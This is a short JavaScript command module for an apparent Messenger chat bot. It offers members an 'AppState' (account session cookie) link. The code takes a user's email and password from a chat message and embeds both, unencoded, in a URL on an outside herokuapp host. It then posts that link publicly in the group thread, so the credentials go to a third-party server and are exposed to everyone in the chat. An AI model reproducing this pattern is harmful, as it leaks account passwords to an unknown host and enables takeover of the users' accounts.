export default {
  name: "أوبستايت",
  author: "kaguya project",
  role: "member",
  description: "يقوم بإعطاء الأعضاء رابطًا للحصول على ملف AppState للحساب باستخدام الإيميل والباسورد المقدمين.",
  execute: async ({ api, event, args }) => {

api.setMessageReaction("⏱️", event.messageID, () => {}, true);
    
    
    const email = args[0];
    const password = args[1];

    if (!email || !password) {
      return api.sendMessage("⚠️ | يرجى تقديم الإيميل وكلمة المرور. مثال : *أوبستايت example@example.com password123", event.threadID, event.messageID);
    }

    const url = `https://appstate-get-86f7174544ec.herokuapp.com/cookie?email=${email}&password=${password}`;

    api.setMessageReaction("✅", event.messageID, () => {}, true);
    

    return api.sendMessage(`✅ تم توليد الأوبستايت بنجاح : ${url}`, event.threadID);
  }
};